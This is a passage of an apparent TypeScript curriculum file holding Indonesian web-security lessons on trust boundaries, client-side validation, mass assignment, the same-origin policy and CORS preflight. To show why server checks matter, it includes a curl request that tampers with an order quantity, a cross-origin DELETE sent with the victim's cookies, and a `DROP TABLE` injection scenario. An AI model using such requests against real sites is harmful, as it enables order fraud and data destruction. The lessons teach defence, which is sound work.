import {
  callout,
  code,
  compare,
  h2,
  ol,
  p,
  references,
  steps,
  table,
  terms,
} from '@/lib/content/builders';
import { type LessonDraft, written } from '@/lib/curriculum/authoring';

/**
 * Keamanan Fullstack — Chapter 1, seven lessons.
 *
 * The browser half of the chain. Every lesson here answers the same question from a different
 * angle: what does an attacker get to control before your server ever sees the request, and
 * which control stops it.
 *
 * Deliberately not a second OWASP list. `backend-intermediate/keamanan-backend` already walks
 * the ten categories server-side; this chapter follows one request across the trust boundary
 * instead, because that is the view a person building a fullstack feature actually needs.
 */
export const lessons: LessonDraft[] = [
  written(
    'batas-kepercayaan',
    'Batas Kepercayaan Aplikasi Fullstack',
    12,
    'Satu garis yang menentukan apa yang boleh dipercaya dan apa yang tidak.',
    [
      p(
        'Aplikasi fullstack terlihat seperti satu program utuh saat kamu menulisnya. Ada folder frontend, ada folder backend, keduanya berada di satu repositori, dan keduanya kamu tulis di editor yang sama. Perasaan itu menyesatkan. Begitu aplikasinya berjalan, kedua bagian tadi hidup di **dua tempat yang sama sekali berbeda**, dan salah satunya berada di komputer orang lain yang tidak bisa kamu kendalikan sedikit pun.',
      ),
      p(
        'Seluruh isi kategori ini berdiri di atas satu gagasan itu. Kalau kamu memahaminya dengan benar, sebagian besar aturan keamanan yang tampak sewenang-wenang akan terasa masuk akal dengan sendirinya.',
      ),

      terms(
        {
          term: 'trust boundary (trust boundary)',
          meaning:
            'Garis khayal yang memisahkan bagian sistem yang **kamu kendalikan** dari bagian yang **dikendalikan orang lain**. Dibaca "trast baundari". Di aplikasi web, garis itu berada tepat di antara browser dan server. Semua data yang menyeberangi garis ini harus diperlakukan sebagai data asing, sekalipun kode yang mengirimnya kamu tulis sendiri.',
        },
        {
          term: 'klien (client)',
          meaning:
            'Program yang mengirim permintaan ke server. Biasanya browser, tetapi bisa juga aplikasi mobile, skrip `curl`, atau program buatan siapa pun. Poin pentingnya bukan istilahnya, melainkan kenyataan bahwa **kamu tidak pernah tahu klien mana yang sedang bicara denganmu**, karena semua klien mengirim permintaan HTTP yang bentuknya sama.',
        },
        {
          term: 'origin',
          meaning:
            'Gabungan tiga hal dari sebuah alamat, yaitu skema, host, dan port. Alamat `https://toko.com/produk` punya origin `https://toko.com`. Origin adalah satuan yang dipakai browser untuk memutuskan siapa boleh membaca data siapa, jadi istilah ini akan muncul terus di sub-bab berikutnya.',
        },
        {
          term: 'penyerang (attacker)',
          meaning:
            'Bukan hanya peretas ahli. Dalam praktik sehari-hari, penyerang adalah siapa pun yang mengirim permintaan yang tidak kamu harapkan. Bisa pengguna iseng yang mengubah angka di URL, bisa bot yang memindai ribuan situs sekaligus, bisa juga pengguna sah yang akunnya diambil alih orang lain.',
        },
        {
          term: 'threat modeling',
          meaning:
            'Kebiasaan bertanya "apa yang bisa salah" **sebelum** menulis kode, bukan sesudah ada insiden. Bentuk paling sederhananya cuma empat pertanyaan, dan versi lengkapnya bisa kamu lihat di sub-bab [Insecure Design](/kelas/backend-intermediate/keamanan-backend/insecure-design).',
        },
        {
          term: 'defense in depth',
          meaning:
            'Prinsip memasang lebih dari satu pertahanan untuk satu risiko, dengan asumsi salah satunya suatu saat akan bolong. Contohnya validasi di server, ditambah batas hak akses database, ditambah pemantauan. Lapisan kedua tidak menggantikan lapisan pertama, melainkan membatasi kerusakan ketika lapisan pertama gagal.',
        },
        {
          term: 'zero trust',
          meaning:
            'Sikap yang menolak menjadikan **posisi jaringan** sebagai bukti kewenangan. Permintaan yang datang dari dalam jaringan kantor, dari sesama container, atau dari halaman admin yang tidak ada tautannya tetap harus membuktikan diri. Alasannya sederhana, yaitu satu akun bocor atau satu lubang saja sudah cukup untuk menempatkan penyerang di dalam perimeter.',
        },
        {
          term: 'DevTools',
          meaning:
            'Perkakas bawaan browser yang dibuka dengan F12. Di dalamnya ada tab Network yang memperlihatkan setiap permintaan beserta isinya, tab Console yang bisa menjalankan JavaScript apa pun di halaman itu, dan tab Application yang memperlihatkan cookie dan penyimpanan lokal. Semua orang punya perkakas ini, termasuk pengunjung situsmu.',
        },
      ),

      h2('Kode frontend berjalan di komputer orang lain'),
      p(
        'Bayangkan kamu membuat form pemesanan dengan batas maksimal sepuluh barang per pesanan. Kamu menuliskannya di React seperti ini.',
      ),
      code(
        'jsx',
        `
        // Berjalan di BROWSER pengunjung.
        function FormPesanan() {
          const [jumlah, setJumlah] = useState(1);

          function kirim() {
            if (jumlah > 10) {
              alert('Maksimal 10 barang per pesanan');
              return;
            }
            fetch('/api/pesanan', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ produkId: 7, jumlah }),
            });
          }

          return <input type="number" max={10} value={jumlah} onChange={...} />;
        }
        `,
        { filename: 'FormPesanan.jsx' },
      ),
      p(
        'Ada dua pertahanan yang terlihat di potongan ini. Atribut `max={10}` pada `<input>` membuat browser menolak angka di atas sepuluh, dan pemeriksaan `if (jumlah > 10)` membatalkan pengiriman. Keduanya bekerja dengan baik untuk pengguna biasa, dan memang itulah gunanya. Keduanya juga **tidak bernilai sama sekali** sebagai pertahanan keamanan.',
      ),
      p(
        'Alasannya ada pada kalimat di komentar baris pertama. Seluruh kode itu dikirim ke komputer pengunjung, lalu dijalankan di sana. Pengunjung bisa membuka DevTools, menghapus pemeriksaannya, mengubah nilai variabelnya, atau melewati halamanmu sama sekali dan mengirim permintaan langsung.',
      ),
      code(
        'bash',
        `
        # Tidak ada halaman, tidak ada React, tidak ada input dengan max=10.
        curl -X POST https://toko.com/api/pesanan \\
          -H 'Content-Type: application/json' \\
          -d '{"produkId": 7, "jumlah": 99999}'
        `,
      ),
      p(
        'Perintah `curl` di atas adalah seluruh serangannya. Tidak ada perkakas khusus dan tidak ada keahlian yang perlu dipelajari, karena `curl` hanya mengirim permintaan HTTP biasa, persis seperti yang dikirim browser. Server tidak punya cara untuk membedakan permintaan ini dari permintaan yang lahir di form-mu sendiri, sebab yang sampai ke server hanyalah teks permintaan, bukan riwayat bagaimana teks itu disusun.',
      ),
      code(
        'text',
        `
        POST /api/pesanan HTTP/1.1
        Host: toko.com
        Content-Type: application/json
        Cookie: sesi=a1b2c3...
        Content-Length: 34

        {"produkId": 7, "jumlah": 99999}
        `,
        { caption: 'Inilah yang benar-benar diterima server, dan hanya ini.' },
      ),
      p(
        'Potongan di atas adalah wujud sesungguhnya sebuah permintaan HTTP, yaitu beberapa baris teks biasa. Perhatikan tidak ada satu pun baris yang menyebut halaman mana yang mengirimnya, komponen React mana yang memanggilnya, atau apakah tombol kirim benar-benar diklik seseorang. Informasi itu memang tidak pernah ada, karena HTTP tidak dirancang untuk membawanya.',
      ),
      p(
        'Karena itu pertanyaan "bagaimana server tahu permintaan ini berasal dari form saya" punya jawaban yang mengecewakan tetapi penting, yaitu server tidak akan pernah bisa tahu. Permintaan yang lahir dari form-mu dan permintaan yang diketik seseorang di terminal menghasilkan teks yang bentuknya sama persis. Satu-satunya hal yang bisa diperiksa server adalah **isi** teks itu, dan isi teks itu sepenuhnya bisa dikarang pengirimnya.',
      ),
      p(
        'Analogi yang cukup dekat adalah kertas pesanan di sebuah restoran. Dapur menerima kertas bertuliskan "meja 4, dua porsi rendang", dan dapur tidak punya cara memastikan kertas itu benar-benar ditulis pelayan alih-alih diselipkan tamu iseng. Kalau dapur ingin yakin, ia harus memeriksa sendiri apakah meja 4 memang ada dan apakah rendangnya memang tersedia, bukan mempercayai kertasnya.',
      ),
      p(
        'Perhatikan nilai `99999` di baris terakhir. Kalau server percaya begitu saja, kamu bisa mendapat pesanan sembilan puluh sembilan ribu barang yang stoknya tidak ada, atau lebih buruk lagi, angka negatif yang membuat total harganya menjadi minus dan saldo pengguna justru bertambah.',
      ),
      p(
        'Nilai yang lebih berbahaya justru bukan yang besar, melainkan yang **negatif**. Kirim `jumlah: -5` pada endpoint yang menghitung total dengan mengalikan harga dan jumlah, dan totalnya menjadi minus. Kalau alur pembayaran memperlakukan total minus sebagai pengembalian dana, kamu baru saja membuat fitur yang mentransfer uang ke pembeli setiap kali ia memesan.',
      ),
      p(
        'Kelas kesalahan ini punya beberapa bentuk yang semuanya lahir dari akar yang sama, yaitu angka yang tidak dibatasi dari kedua sisi. Nilai nol membuat pesanan kosong yang tetap memotong stok. Nilai pecahan seperti `2.5` bisa lolos ke perhitungan lalu menghasilkan sisa yang aneh di laporan. Nilai yang sangat besar bisa melampaui batas tipe angka database dan gagal di tempat yang jauh dari titik masuknya.',
      ),
      p(
        'Yang harus dilakukan server bukan sekadar mengulang pemeriksaan `> 10`, melainkan menyatakan bentuk yang sah secara lengkap, yaitu bilangan bulat, minimal satu, maksimal sepuluh. Cara menuliskannya ada di sub-bab 3.1, dan alasannya berdiri di sini, yaitu setiap batas yang hanya ada di browser sama dengan tidak ada batas sama sekali.',
      ),
      callout(
        'danger',
        'Validasi di klien adalah kenyamanan, bukan keamanan',
        'Atribut `max`, `required`, `pattern`, dan setiap pemeriksaan `if` di JavaScript berguna untuk memberi tahu pengguna lebih cepat tanpa menunggu jaringan. Tidak satu pun dari semuanya bisa dipakai sebagai jaminan. Aturan yang sama harus ditegakkan lagi di server, dan pemeriksaan di serverlah yang benar-benar berlaku.',
      ),

      h2('Menggambar batasnya untuk satu fitur'),
      p(
        'Cara paling praktis memakai gagasan ini adalah menggambar batasnya untuk fitur yang sedang kamu bangun. Ambil contoh fitur komentar sederhana, lalu petakan siapa mengendalikan apa.',
      ),
      table(
        ['Bagian', 'Siapa yang mengendalikan', 'Boleh dipercaya?'],
        [
          ['Kode React di browser', 'Pengunjung', 'Tidak'],
          ['Isi form komentar', 'Pengunjung', 'Tidak'],
          ['Header permintaan, termasuk `User-Agent` dan `Referer`', 'Pengunjung', 'Tidak'],
          [
            'Cookie yang dikirim balik',
            'Pengunjung bisa menghapus, tidak bisa memalsukan tanda tangannya',
            'Sebagian',
          ],
          ['Id pengguna hasil verifikasi sesi di server', 'Server', 'Ya'],
          ['Baris di database', 'Server', 'Ya, selama penulisannya dijaga'],
        ],
        'Peta trust boundary fitur komentar. Semua baris "Tidak" harus divalidasi ulang di server.',
      ),
      p(
        'Baris keempat yang paling sering disalahpahami, jadi ia layak dibahas tersendiri. Cookie memang disimpan di browser dan pengunjung bisa melihat serta menghapusnya, tetapi isi cookie sesi biasanya berupa nilai acak panjang atau nilai bertanda tangan. Pengunjung bisa membuangnya, namun tidak bisa mengarang nilai baru yang dianggap sah oleh server, karena ia tidak memegang kunci penandatangannya.',
      ),
      p(
        'Contoh konkretnya begini. Cookie sesi berisi nilai seperti `sesi=8f2a1c9b4e7d...`, yaitu tiga puluh dua karakter acak yang dihasilkan server dan disimpan di tabel sesi. Pengunjung bisa membukanya di tab Application pada DevTools, menyalinnya, bahkan menghapusnya. Yang tidak bisa ia lakukan adalah mengarang nilai baru yang kebetulan ada di tabel sesi milik orang lain, karena peluang menebaknya praktis nol.',
      ),
      p(
        'Kalau sesinya berupa nilai bertanda tangan alih-alih nilai acak, alasannya berbeda tetapi hasilnya sama. Server melampirkan tanda tangan yang dihitung memakai kunci rahasia, lalu memeriksanya setiap kali cookie kembali. Pengunjung bisa mengubah isi cookie sesukanya, tetapi ia tidak bisa menghitung tanda tangan yang cocok tanpa memegang kuncinya, sehingga perubahan apa pun langsung ditolak.',
      ),
      p(
        'Inilah kenapa kolomnya diisi "Sebagian" dan bukan "Tidak". Cookie bukan data yang bebas dikarang seperti body permintaan, tetapi juga bukan data yang sepenuhnya dikendalikan server seperti baris database. Ia berada di tengah, dan posisi tengah itulah yang membuat aturan cookie di sub-bab 1.5 punya bentuk yang khas.',
      ),
      p(
        'Baris kelima adalah satu-satunya sumber identitas yang benar. Perhatikan bunyinya, yaitu **hasil verifikasi sesi di server**, bukan id pengguna yang dikirim klien di body permintaan. Perbedaan dua hal itu adalah akar dari seluruh kelas kerentanan yang dibahas di sub-bab [IDOR](/kelas/backend-basic/auth-dasar/idor).',
      ),
      code(
        'js',
        `
        // SALAH: id pengguna diambil dari body, yang sepenuhnya dikendalikan klien.
        app.post('/api/komentar', async (req, res) => {
          const { penulisId, isi } = req.body;
          await db.komentar.create({ data: { penulisId, isi } });
        });

        // BENAR: id pengguna diambil dari sesi yang sudah diverifikasi server.
        app.post('/api/komentar', async (req, res) => {
          const penulisId = req.session.penggunaId;
          const { isi } = SkemaKomentar.parse(req.body);
          await db.komentar.create({ data: { penulisId, isi } });
        });
        `,
      ),
      p(
        'Bedanya hanya satu baris, tetapi baris itu memindahkan sumber identitas dari sisi luar batas ke sisi dalam. Pada versi salah, siapa pun bisa mengirim `penulisId` milik orang lain dan menulis komentar atas nama korban. Pada versi benar, `req.session.penggunaId` diisi server sesudah cookie sesinya diverifikasi, sehingga nilai yang dikirim klien di body tidak pernah dilirik.',
      ),
      p(
        'Perhatikan juga `SkemaKomentar.parse(req.body)` di versi benar hanya mengambil `isi`. Bentuk itu bukan kebetulan, melainkan cara menutup celah yang disebut mass assignment, yaitu ketika seluruh body diteruskan mentah-mentah ke fungsi penyimpanan sehingga field yang tidak kamu maksudkan ikut tersimpan. Rinciannya ada di sub-bab 2.1 kategori ini.',
      ),
      p(
        'Untuk melihat apa yang rusak tanpa langkah itu, bayangkan versi yang menulis `data: { ...req.body, penulisId: req.session.penggunaId }`. Bentuk itu terlihat aman karena `penulisId` ditulis belakangan sehingga menimpa nilai dari klien. Masalahnya bukan pada `penulisId`, melainkan pada setiap kolom lain yang kebetulan ada di tabel itu.',
      ),
      p(
        'Kirim body `{"isi":"halo","disetujui":true,"dibuatPada":"2020-01-01"}` dan ketiganya masuk ke database. Komentar itu lolos antrean moderasi tanpa pernah ditinjau, sekaligus muncul di urutan paling atas karena tanggalnya dikarang. Tidak ada error, tidak ada peringatan, dan tidak ada yang akan menyadarinya sampai seseorang bertanya kenapa komentar spam bisa tampil lebih dulu.',
      ),

      h2('Empat pertanyaan sebelum menulis fitur'),
      p(
        'Model ancaman terdengar seperti pekerjaan besar, padahal versi harian yang berguna cuma empat pertanyaan. Jawab keempatnya di awal, dan sebagian besar kerentanan tidak akan pernah lahir.',
      ),
      steps(
        {
          title: 'Apa yang sedang dibangun?',
          body: 'Sebutkan alurnya dalam satu kalimat, lalu sebutkan data apa yang disentuh. Fitur komentar menyentuh isi komentar, identitas penulis, dan artikel yang dikomentari.',
        },
        {
          title: 'Apa yang bisa salah?',
          body: 'Untuk tiap data tadi, tanyakan apa yang terjadi kalau nilainya dikarang. Komentar berisi tag HTML, penulis yang bukan dirinya sendiri, artikel yang seharusnya tidak bisa dia akses.',
        },
        {
          title: 'Apa yang akan dilakukan soal itu?',
          body: 'Pasangkan tiap risiko dengan satu kontrol yang konkret. Escaping saat menampilkan, identitas dari sesi, pemeriksaan kepemilikan artikel di lapisan data.',
        },
        {
          title: 'Apakah sudah cukup baik?',
          body: 'Uji jalur yang seharusnya ditolak, bukan hanya jalur yang seharusnya berhasil. Kalau tidak ada satu pun tes yang membuktikan penolakan, kontrolnya belum terbukti ada.',
        },
      ),
      p(
        'Pertanyaan keempat adalah yang paling sering dilewati, dan sekaligus yang paling menentukan. Kontrol keamanan tidak menimbulkan gejala apa pun ketika ia hilang, karena aplikasinya tetap berjalan normal untuk pengguna yang berperilaku wajar. Satu-satunya cara mengetahui kontrolnya benar-benar terpasang adalah menulis tes yang mencoba menembusnya.',
      ),
      p(
        'Bentuk paling murah dari pertanyaan keempat adalah satu tes yang sengaja gagal. Login sebagai pengguna A, ambil id komentar milik pengguna B, lalu panggil endpoint hapus dan pastikan jawabannya penolakan. Tes itu memakan waktu lima menit untuk ditulis dan akan terus berjaga setiap kali seseorang menyentuh kode otorisasi di kemudian hari.',
      ),
      p(
        'Bandingkan dengan cara yang biasa dipakai, yaitu membuka aplikasi lalu memastikan tombol hapus tidak muncul di komentar orang lain. Pemeriksaan itu membuktikan tombolnya disembunyikan, bukan membuktikan aksinya ditolak. Keduanya terasa mirip di layar, padahal yang pertama tidak menghalangi siapa pun yang memanggil API secara langsung.',
      ),

      h2('Kenapa satu pertahanan tidak pernah cukup'),
      p(
        'Setiap kontrol yang akan kamu pelajari di kategori ini punya cara gagal masing-masing. Escaping bisa terlewat di satu tempat. Validasi bisa lupa dipasang di satu endpoint baru. Library bisa punya celah yang belum ditambal. Karena itu kontrol dipasang berlapis, dengan asumsi terbuka bahwa salah satunya suatu hari akan bolong.',
      ),
      compare(
        {
          title: 'Satu lapis',
          lang: 'text',
          code: `
          Validasi di server
                 |
                 v
          Query ke database sebagai pemilik skema
          `,
          notes: [
            'Kalau satu endpoint lupa divalidasi, penyerang langsung berhadapan dengan database.',
            'Hak akses penuh berarti kerusakan tidak punya batas atas.',
          ],
        },
        {
          title: 'Berlapis',
          lang: 'text',
          code: `
          Validasi skema di server
                 |
                 v
          Query terparameter
                 |
                 v
          User database tanpa hak DDL
                 |
                 v
          Pemantauan dan alert
          `,
          notes: [
            'Endpoint yang lupa divalidasi masih terlindung parameterisasi.',
            'Injeksi yang lolos tetap tidak bisa menghapus tabel.',
            'Percobaannya tercatat, jadi kamu tahu sebelum kerusakannya meluas.',
          ],
        },
      ),
      p(
        'Perhatikan kolom kanan tidak mengganti lapisan pertama dengan lapisan yang lebih baik. Ia menambahkan lapisan di bawahnya. Validasi tetap kontrol utama, sedangkan parameterisasi, hak akses minimum, dan pemantauan adalah jaring yang menangkap kegagalan validasi. Setiap kali kamu tergoda mengganti dua lapisan dengan satu lapisan yang terasa lebih pintar, ingat bahwa lapisan itu juga bisa gagal.',
      ),
      p(
        'Baris `User database tanpa hak DDL` layak diperhatikan tersendiri. DDL adalah singkatan dari Data Definition Language, yaitu perintah SQL yang mengubah struktur seperti `DROP TABLE` dan `ALTER TABLE`. Aplikasi web biasa tidak pernah membutuhkannya saat melayani permintaan, jadi memberi kredensial tanpa hak itu tidak merugikan apa pun sekaligus menghapus skenario terburuknya.',
      ),
      p(
        'Untuk merasakan selisihnya, bandingkan dua skenario dengan lubang yang sama persis. Pada aplikasi yang terhubung sebagai pemilik skema, satu injeksi yang lolos bisa menjalankan `DROP TABLE pesanan` dan seluruh riwayat transaksi hilang dalam satu permintaan. Pada aplikasi yang kredensialnya hanya boleh membaca dan menulis baris, injeksi yang sama persis berhenti pada pesan penolakan izin dari database.',
      ),
      p(
        'Lubangnya tidak berkurang sedikit pun di skenario kedua, dan itulah intinya. Yang berubah hanyalah batas atas kerusakannya, dari kehilangan struktur data menjadi perubahan baris yang masih bisa ditelusuri dan dipulihkan dari cadangan. Keputusan yang menghasilkan selisih sebesar itu diambil sekali saat menyiapkan database, dan tidak menuntut satu baris kode aplikasi pun.',
      ),
      callout(
        'tip',
        'Cara memakai kategori ini',
        'Bab 1 mengikuti serangan dari sisi browser, dan Bab 2 memasang pertahanannya di sisi server. Keduanya bertemu lagi di sub-bab terakhir, yang menelusuri satu fitur komentar lapis demi lapis. Kalau kamu hanya sempat membaca satu sub-bab, baca yang terakhir itu, lalu kembali ke sini untuk memahami kenapa tiap lapisnya ada.',
      ),

      references(
        {
          label: 'Website security',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Server-side/First_steps/Website_security',
          source: 'MDN',
          note: 'Pengantar resmi soal kenapa data dari klien tidak pernah boleh dipercaya.',
        },
        {
          label: 'Threat Modeling Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Versi lengkap dari empat pertanyaan yang dipakai di sub-bab ini.',
        },
        {
          label: 'Origin',
          href: 'https://developer.mozilla.org/en-US/docs/Glossary/Origin',
          source: 'MDN',
          note: 'Definisi resmi origin sebagai gabungan skema, host, dan port.',
        },
        {
          label: 'Client-side form validation',
          href: 'https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation',
          source: 'MDN',
          note: 'Menyebut sendiri bahwa validasi di klien tidak menggantikan validasi di server.',
        },
      ),
    ],
  ),

  written(
    'same-origin-cors',
    'Same-Origin Policy dan CORS',
    14,
    'Aturan tertua browser, dan pintu yang kamu buka sendiri untuknya.',
    [
      p(
        'CORS biasanya pertama kali dikenal sebagai pesan error merah di Console, dan kesan pertama itu membuat banyak orang memperlakukannya sebagai gangguan yang harus dimatikan. Kalau kamu belum pernah bertemu bentuk dasarnya, baca dulu sub-bab [CORS](/kelas/frontend-basic/ajax-web-api/cors) di Frontend Basic. Di sini kita membahas sisi lainnya, yaitu apa yang sebenarnya dijaga aturan ini, dan tiga cara konfigurasi CORS diam-diam menjadi tidak berarti.',
      ),

      terms(
        {
          term: 'Same-Origin Policy (SOP)',
          meaning:
            'Aturan bawaan browser yang melarang halaman dari satu origin **membaca** respons dari origin lain. Dibaca "sem-orijin polisi". Aturan ini sudah ada sejak lama dan berlaku otomatis tanpa perlu kamu nyalakan. Tanpa SOP, satu tab berisi situs jahat bisa membaca isi inbox email yang sedang terbuka di tab sebelah.',
        },
        {
          term: 'cross-origin',
          meaning:
            'Sebutan untuk permintaan yang tujuannya berbeda origin dari halaman yang mengirimnya. Halaman di `https://app.toko.com` yang memanggil `https://api.toko.com` sudah terhitung cross-origin, karena hostnya berbeda meski domainnya sama. Perbedaan port dan skema juga cukup untuk membuatnya cross-origin.',
        },
        {
          term: 'CORS',
          meaning:
            'Singkatan dari **Cross-Origin Resource Sharing**, dibaca "kors". Bukan pembatas tambahan, melainkan **mekanisme untuk melonggarkan** SOP secara terkendali. Server memakai sejumlah header untuk berkata kepada browser bahwa origin tertentu boleh membaca responsnya.',
        },
        {
          term: 'preflight',
          meaning:
            'Permintaan `OPTIONS` yang dikirim browser **lebih dulu**, sebelum permintaan aslinya, untuk bertanya apakah operasi itu diizinkan. Dibaca "prifla-it". Browser melakukannya sendiri tanpa kode apa pun darimu, jadi kalau kamu melihat `OPTIONS` di log server, itu bukan kesalahan.',
        },
        {
          term: '`Access-Control-Allow-Origin`',
          meaning:
            'Header respons yang menyebut origin mana yang boleh membaca hasilnya. Isinya satu origin persis seperti `https://app.toko.com`, atau tanda bintang `*` yang berarti siapa saja. Header ini yang dicari browser sebelum menyerahkan respons ke kodemu.',
        },
        {
          term: '`Access-Control-Allow-Credentials`',
          meaning:
            'Header respons yang menyatakan bahwa browser boleh menyertakan **cookie dan header otorisasi** pada permintaan cross-origin itu, sekaligus boleh membaca hasilnya. Header inilah yang mengubah CORS dari urusan data publik menjadi urusan sesi pengguna.',
        },
        {
          term: 'simple request',
          meaning:
            'Permintaan yang bentuknya cukup mirip dengan pengiriman form HTML biasa sehingga browser tidak repot mengirim preflight. Syaratnya ketat, yaitu metodenya `GET`, `HEAD`, atau `POST`, dan header yang dipakai terbatas. Menambahkan satu header khusus saja sudah membuatnya tidak sederhana lagi.',
        },
        {
          term: '`Vary: Origin`',
          meaning:
            'Header yang memberi tahu cache bahwa isi respons berbeda tergantung nilai header `Origin` pada permintaan. Tanpa header ini, cache bisa menyimpan respons untuk satu origin lalu menyajikannya kepada origin lain, sehingga hasil pemeriksaan CORS-mu bocor ke pihak yang seharusnya ditolak.',
        },
      ),

      h2('Apa yang sebenarnya dijaga'),
      p(
        'Kesalahpahaman paling umum adalah menganggap SOP mencegah permintaan terkirim. Yang dicegah SOP bukan pengirimannya, melainkan **pembacaan responsnya oleh JavaScript**. Bedanya besar, dan seluruh sub-bab CSRF nanti berdiri di atas perbedaan ini.',
      ),
      table(
        ['Aksi dari halaman jahat', 'Terkirim ke server?', 'Bisa dibaca hasilnya?'],
        [
          [
            '`<img src="https://bank.com/logo.png">`',
            'Ya',
            'Tidak, hanya bisa tahu berhasil atau gagal',
          ],
          ['`<form>` yang dikirim ke `bank.com`', 'Ya, lengkap dengan cookie', 'Tidak'],
          [
            '`fetch("https://bank.com/saldo")` tanpa CORS',
            'Ya, sampai ke server',
            'Tidak, browser membuang responsnya',
          ],
          ['`fetch` ke origin yang diizinkan CORS', 'Ya', 'Ya'],
        ],
        'SOP menahan pembacaan, bukan pengiriman. Baris kedua adalah alasan CSRF bisa terjadi.',
      ),
      p(
        'Perhatikan baris ketiga dengan saksama, karena di situlah letak kebingungan yang paling sering terjadi. Ketika kamu melihat error CORS di Console, permintaannya **sudah sampai ke server dan sudah diproses**. Kalau endpoint itu menghapus data, data itu benar-benar terhapus. Yang gagal hanyalah langkah terakhir, yaitu browser menolak menyerahkan respons kepada JavaScript pemanggilnya.',
      ),
      p(
        'Contoh konkretnya begini. Halaman jahat memanggil `fetch("https://api.toko.com/pesanan/7", { method: "DELETE", credentials: "include" })`. Browser mengirim preflight, servermu menolak origin itu, dan permintaan `DELETE` yang asli tidak pernah terkirim. Sampai di sini CORS memang menolong.',
      ),
      p(
        'Sekarang ganti dengan permintaan yang tidak memicu preflight, misalnya pengiriman form `POST` biasa. Tidak ada pertanyaan yang diajukan lebih dulu, permintaannya langsung dikirim beserta cookie korban, dan servermu memprosesnya sampai selesai. Browser baru menolak di langkah terakhir ketika hendak menyerahkan responsnya, dan pada saat itu datanya sudah berubah.',
      ),
      p(
        'Dua contoh itu menjelaskan kenapa CORS dan CSRF dibahas sebagai dua hal terpisah di kategori ini. CORS mengatur siapa boleh membaca, sedangkan yang mengatur siapa boleh menulis adalah autentikasi, otorisasi, dan pertahanan CSRF di sub-bab 1.5. Menganggap CORS menutup keduanya adalah salah satu salah paham keamanan web yang paling mahal.',
      ),
      p(
        'Konsekuensi praktisnya perlu ditegaskan. CORS tidak melindungi endpoint yang mengubah data. Perlindungan untuk itu datang dari autentikasi, otorisasi, dan pertahanan CSRF, semuanya bekerja di server. CORS hanya mengatur siapa yang boleh **membaca** hasilnya di browser.',
      ),
      callout(
        'warning',
        'CORS adalah kontrol browser, bukan kontrol akses',
        'CORS hanya berlaku pada permintaan yang dikirim halaman web lewat browser. Perintah `curl`, skrip Python, dan aplikasi mobile mengabaikannya sepenuhnya karena mereka memang tidak menjalankan aturan browser. Endpoint yang perlu dijaga tetap harus memeriksa autentikasi dan otorisasi di server.',
      ),

      h2('Kapan browser mengirim preflight'),
      p(
        'Preflight sering terlihat misterius karena ia muncul tanpa kamu memintanya. Aturannya sebenarnya sederhana, yaitu browser mengirim preflight ketika permintaannya bisa menimbulkan efek yang tidak mungkin dilakukan HTML biasa.',
      ),
      compare(
        {
          title: 'Tanpa preflight',
          lang: 'js',
          code: `
          // POST dengan Content-Type bawaan form.
          fetch('https://api.toko.com/lacak', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: 'id=7',
          });
          `,
          notes: [
            'Bentuknya bisa ditiru <form> HTML biasa.',
            'Langsung dikirim, hasilnya baru diperiksa CORS.',
          ],
        },
        {
          title: 'Dengan preflight',
          lang: 'js',
          code: `
          // JSON dan header Authorization membuatnya tidak sederhana.
          fetch('https://api.toko.com/pesanan/7', {
            method: 'DELETE',
            headers: {
              'Content-Type': 'application/json',
              Authorization: 'Bearer ...',
            },
          });
          `,
          notes: [
            'Browser mengirim OPTIONS lebih dulu.',
            'Permintaan asli hanya dikirim kalau OPTIONS mengizinkan.',
          ],
        },
      ),
      p(
        'Kolom kiri lolos tanpa preflight karena `Content-Type: application/x-www-form-urlencoded` adalah salah satu dari tiga nilai yang bisa dihasilkan form HTML biasa. Karena halaman jahat sudah bisa melakukannya sejak dulu dengan `<form>`, browser menilai tidak ada gunanya bertanya lebih dulu.',
      ),
      p(
        'Kolom kanan memicu preflight karena dua alasan sekaligus. Metode `DELETE` tidak pernah bisa dihasilkan `<form>`, dan header `Authorization` bukan header yang boleh dipasang form. Browser bertanya dulu lewat `OPTIONS`, dan kalau servermu tidak menjawab pertanyaan itu dengan benar, permintaan `DELETE` yang asli **tidak pernah dikirim sama sekali**.',
      ),
      code(
        'text',
        `
        # 1. Browser bertanya lebih dulu, tanpa diminta kodemu.
        OPTIONS /pesanan/7 HTTP/1.1
        Origin: https://app.toko.com
        Access-Control-Request-Method: DELETE
        Access-Control-Request-Headers: authorization, content-type

        # 2. Server menjawab apa yang diizinkan.
        HTTP/1.1 204 No Content
        Access-Control-Allow-Origin: https://app.toko.com
        Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
        Access-Control-Allow-Headers: Content-Type, Authorization
        Access-Control-Max-Age: 600

        # 3. Baru sesudah itu permintaan aslinya dikirim.
        DELETE /pesanan/7 HTTP/1.1
        Authorization: Bearer ...
        `,
      ),
      p(
        'Perhatikan permintaan `OPTIONS` sama sekali tidak membawa body dan tidak membawa cookie. Ia hanya bertanya, yaitu apakah origin ini boleh memakai metode `DELETE` dan header `Authorization`. Karena sifatnya bertanya, ia tidak boleh punya efek apa pun di servermu, dan route `OPTIONS` yang menjalankan logika bisnis adalah tanda ada yang salah.',
      ),
      p(
        'Baris `Access-Control-Request-Headers` menjelaskan kenapa daftar `allowedHeaders` di konfigurasimu harus lengkap. Browser menyebutkan setiap header tidak baku yang hendak dipakai, dan bila salah satunya tidak ada di jawaban server, seluruh permintaan dibatalkan. Menambahkan satu header baru di klien tanpa memperbaruinya di server adalah penyebab error CORS yang paling sering muncul mendadak pada fitur yang kemarin masih jalan.',
      ),
      p(
        'Nomor tiga adalah bagian yang membuat masalah preflight terasa membingungkan saat ditelusuri. Kalau jawaban `OPTIONS` salah, yang kamu lihat di Console adalah error tentang `DELETE`, padahal `DELETE` tidak pernah dikirim sama sekali. Tempat memperbaikinya selalu ada di jawaban `OPTIONS`, bukan di handler `DELETE`.',
      ),
      p(
        'Inilah sebabnya endpoint yang terasa berfungsi lewat `curl` bisa gagal dari browser. `curl` tidak mengenal preflight, sehingga ia langsung mengirim `DELETE`. Browser mengirim `OPTIONS` lebih dulu, dan kalau route `OPTIONS` tidak ditangani, yang kamu lihat adalah error CORS padahal masalahnya ada di jawaban preflight.',
      ),

      h2('Konfigurasi yang benar'),
